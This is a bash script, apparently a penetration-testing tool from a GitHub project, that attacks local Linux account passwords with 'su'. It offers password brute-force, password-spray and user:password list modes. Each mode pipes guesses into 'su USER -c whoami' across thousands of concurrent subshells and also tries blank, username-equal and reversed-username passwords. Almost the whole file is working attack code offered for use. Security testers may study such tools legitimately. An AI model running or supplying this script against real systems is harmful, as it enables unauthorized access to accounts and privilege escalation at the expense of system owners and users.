#!/bin/bash

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

# Function to stop all background processes (background subshells)
stop_all_background_processes() {
    echo -e "Stopping all background processes...\n"
    #kill $(jobs -p) # Send SIGTERM to all background processes
    #exit 1
    pkill -P $$
    exit 1
}

# Set a trap to catch the condition and execute the stop_all_background_processes function
#trap 'stop_all_background_processes' SIGINT SIGTERM
trap 'stop_all_background_processes' SIGINT SIGTERM


# Function representing the action you want to perform
getpass() {
    local line="$1"
    local count="$2"
    # Replace the following echo statement with your desired action.
    # For example, you can process the line or call another script with "$line" as an argument.
    
    if ((stop_flag == 0)); then
        if [ "$count" != "0" ]; then
            #echo -e "Processing line: $line [$count / $fcount]"
            printf "Progress (%s)                : [%d / %d]    \r" "$line" "$count" "$fcount"
            #echo -e "\n"
        fi
        
    fi
    
    
    if [ "$MODULE" == "pwdbf" ]; then
        trysu=`echo "$line" | timeout $TIMEOUTS su $USER -c whoami 2>/dev/null`
        
        if [ "$trysu" ]; then
            echo -ne "${BOLD}${RED}Password Found!${RESET} [ Username: ${GREEN}$USER${RESET} : Password: ${GREEN}$line${RESET} ]\n"
            kill -INT $$
            stop_flag=1
            pkill -P $$
            stop_all_background_processes
            exit 1;
        fi
        
        elif [ "$MODULE" == "pwdspr" ]; then
        trysu=`echo "$PASSWORD" | timeout $TIMEOUTS su $line -c whoami 2>/dev/null`
        if [ "$trysu" ]; then
            echo -ne "${BOLD}${RED}Crdentials Found!${RESET} [ Username: ${GREEN}$line${RESET} : Password: ${GREEN}$PASSWORD${RESET} ]\n"
        fi
        
        elif [ "$MODULE" == "usrpwdbf" ]; then
        lusr=`echo $line | cut -d":" -f 1`
        lpwd=`echo $line | cut -d":" -f 2`
        
        trysu=`echo "$lpwd" | timeout $TIMEOUTS su $lusr -c whoami 2>/dev/null`
        if [ "$trysu" ]; then
            echo -ne "${BOLD}${RED}Crdentials Found!${RESET} [ Username: ${GREEN}$line${RESET} : Password: ${GREEN}$PASSWORD${RESET} ]\n"
        fi
        
    fi
    
    
    
}

# --------------------------------------------------------------------------------------------------

echo -e "${BLUE} @TH3xACE - BLAIS David"
echo -e "${BLUE} Contribute and collaborate on the KILLER project @ https://github.com/TH3xACE"
echo -e "${RED} Please consider giving a +1 star on GitHub to show your support! "
echo -e "\n"
echo -e "${RED} IMPORTANT! Always run the latest version. Run 'git pull' or download the project again. \n${RESET}"

help="Usage: $0 [-h|--help] [-m|--module MODULE] [-u|--user USER|-uf|--userfile USERFILE] [-p|--password PASSWORD|-pf|--pwdfile PASSFILE] [-c|--concurrent CONCURRENT] [-s|--sleep SLEEP] [-t|--timeouts TIMEOUTS]\n"

modules="
${YELLOW}Module${RESET}: Password Bruteforce : ${GREEN}pwdbf${RESET}
Example: $0 -m "pwdbf" -u user -pf passwords.txt -c 3000 -s 0.005 -t 0.9

${YELLOW}Module${RESET}: Password Spray : ${GREEN}pwdspr${RESET}
Example: $0 -m pwdspr -uf users.txt -p password -c 3000 -s 0.005 -t 0.9

${YELLOW}Module${RESET}: User:Password Bruteforce : ${GREEN}usrpwdbf${RESET}
Example: $0 -m usrpwdbf -uf users-pwds.txt  -c 3000 -s 0.005 -t 0.9
"

# Initialize variables with default values
MODULE=""
USER=""
PASSWORD=""
PASSFILE=""
CONCURRENT="100"
SLEEP="0.005"
TIMEOUTS="0.8"
USERFILE=""

# Function to display usage help
display_help() {
    echo -e "$help"
    echo -e "$modules"
    exit 0
}

while [[ "$#" -gt 0 ]]; do
    case $1 in
        -h|--help) display_help ;;
        -m|--module) MODULE="$2"; shift ;;
        -u|--user) USER="$2"; shift ;;
        -uf|--userfile) USERFILE="$2"; shift ;;
        -p|--password) PASSWORD="$2"; shift ;;
        -pf|--pwdfile) PASSFILE="$2"; shift ;;
        -c|--concurrent) CONCURRENT="$2"; shift ;;
        -s|--sleep) SLEEP="$2"; shift ;;
        -t|--timeouts) TIMEOUTS="$2"; shift ;;
        *) echo "Unknown option: $1" >&2; display_help ;;
    esac
    shift
done

# Check if both -u and -f were provided
if [ -n "$USER" ] && [ -n "$USERFILE" ]; then
    echo "Error: You cannot provide both --user USER and --userfile USERFILE options." >&2
    display_help
fi

# Check if either -u or -f was provided
if [ -z "$USER" ] && [ -z "$USERFILE" ]; then
    echo "Error: You must provide either --user USER or --userfile USERFILE option." >&2
    display_help
fi

# Read usernames from file if -f option was provided
if [ -n "$USERFILE" ]; then
    if [ ! -f "$USERFILE" ] || [ ! -r "$USERFILE" ]; then
        echo "Error: $USERFILE does not exist or is not readable." >&2
        exit 1
    fi
    #USER=$(cat "$USERFILE")
    USER="$USERFILE"
fi


# Check if both -u and -f were provided
if [ -n "$PASSWORD" ] && [ -n "$PASSFILE" ]; then
    echo "Error: You cannot provide both --password password and --pwdfile PASSFILE options." >&2
    display_help
fi

# Check if either -u or -f was provided
if [ -z "$PASSWORD" ] && [ -z "$PASSFILE" ] && [ -z "$USERFILE" ]; then
    echo "Error: You must provide either --password password or --pwdfile PASSFILE option." >&2
    display_help
fi

# Read usernames from file if -f option was provided
if [ -n "$PASSFILE" ]; then
    if [ ! -f "$PASSFILE" ] || [ ! -r "$PASSFILE" ]; then
        echo "Error: File $PASSFILE does not exist or is not readable." >&2
        exit 1
    fi
    #USER=$(cat "$USERFILE")
    PASSWORD="$PASSFILE"
fi

# Example usage
#echo -e "[+] Module: $MODULE"
echo -e "[+] User: $USER"
echo -e "[+] Password: $PASSWORD"
echo -e "[+] Concurrent: $CONCURRENT"
echo -e "[+] Sleep: $SLEEP"
echo -e "[+] Timeouts: $TIMEOUTS"

# --------------------------------------------------------------------------------------------------

# Create an array to store lines from the data file
lines=()

if [ "$MODULE" == "pwdbf" ]; then
 echo -e "[+] Module: Password Bruteforce"
    if [ -z "$PASSFILE" ] && [ -n "$PASSWORD"]; then
        echo "Error: You must provide --pwdfile PASSFILE option." >&2
        display_help
    fi

    if [ -z "$USER" ] && [ -n "$USERFILE"]; then
        echo "Error: You must provide --user USER." >&2
        display_help
    fi

    # test user with blank password / user = password / user = rev(userS)
    getpass " " "0" &
    getpass "$USER" "0" &
    getpass "echo $USER | rev 2>/dev/null" "0" &
    FILE="$PASSFILE"

elif [ "$MODULE" == "pwdspr" ]; then
 echo -e "[+] Module: Password Spray"
    if [ -n "$PASSFILE" ] && [ -z "$PASSWORD"]; then
        echo "Error: You must provide --password password option." >&2
        display_help
    fi

    if [ -n "$USER" ] && [ -z "$USERFILE" ]; then
        echo "Error: You must provide --userfile USERFILE." >&2
        display_help
    fi

  FILE="$USERFILE"

elif [ "$MODULE" == "usrpwdbf" ]; then
  echo -e "[+] Module: User:Password Bruteforce"
    if [ -n "$USER" ] && [ -z "$USERFILE" ]; then
        if [ -z "$PASSFILE" ] || [ -z "$PASSWORD"]; then
            echo "Error: You must provide --userfile USERFILE." >&2
            display_help
        fi
    fi

   FILE="$USERFILE"
fi

# Read data from the file into the array
while IFS= read -r line; do
    lines+=("$line")
done < "$FILE"

fcount=`cat $FILE | wc -l`

# Number of threads (background subshells) to use
num_threads=$CONCURRENT

###########################

# Check if the 'ulimit' command is available
if ! command -v ulimit >/dev/null 2>&1; then

    echo -e "ulimit binary not found. Max Concurrent process cannot be determined, use a max of 1000"
       #exit 1
      if (( CONCURRENT > 1000 )); then
        echo "[*] It is recommended that you use a maximum thread of 2000!"
        echo -e "Exiting..."
        exit 1
      fi

else
    max_processes=$(ulimit -u)
fi

# Get the maximum number of processes that can be created


if [ "$max_processes" == "unlimited" ]; then

    if (( CONCURRENT > 2000 )); then
        echo "[*] It is recommended that you use a maximum thread of 2000!"
        echo -e "Exiting..."
        exit 1
    fi

else

    # # Check if an argument is provided for concurrent processes
    # if [ $# -eq 0 ]; then
    #     echo -e "Error: Please provide the number of concurrent processes as an argument."
    #     exit 1
    # fi

    # Read the concurrent process input from the argument
    concurrent_processes=$num_threads

    # Check if the provided value is a valid number
    if ! [[ "$concurrent_processes" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
        echo -e "Error: Invalid input. Please provide a valid number for concurrent processes."
        exit 1
    fi

    # Calculate 0.6 of the max processes using the concurrent_processes variable
    desired_max_processes=$((max_processes * 6 / 10))

    #echo -e "Concurrent processes: $concurrent_processes"
    echo -e "[*] Recommended Max Threads (60% of Actual Possible Max Threads): $desired_max_processes"

    # Check if the concurrent processes is 0.6 of the max processes
    #if (( $(bc <<< "$concurrent_processes <= 0.6 * $max_processes") )); then
    if (( concurrent_processes <= desired_max_processes )); then
        echo "-e [+] No of Threads: $concurrent_processes ( You can go up to $desired_max_process )"
    else
        echo -e "[+] No of Threads: ($concurrent_processes) > than recommended one ($desired_max)"
        echo -e "[*] Exiting..."
        exit 1
    fi

fi
############################

# Variable to indicate whether the stop condition is encountered
stop_flag=0

# Iterate over the array and execute the action function in background subshells
for ((i = 0; i < ${#lines[@]}; i++)); do
    if ((stop_flag == 0)); then
        getpass "${lines[$i]}" "$i" &
        #sleep 0.001
        sleep $SLEEP
        # Limit the number of running background subshells to num_threads
        if (( (i + 1) % num_threads == 0 )); then
            wait # Wait for the background subshells to finish before starting the next batch
        fi
    else
        kill -INT $$
        pkill -P $$
        stop_all_background_processes
    fi
done

# Wait for any remaining background subshells to finish
wait

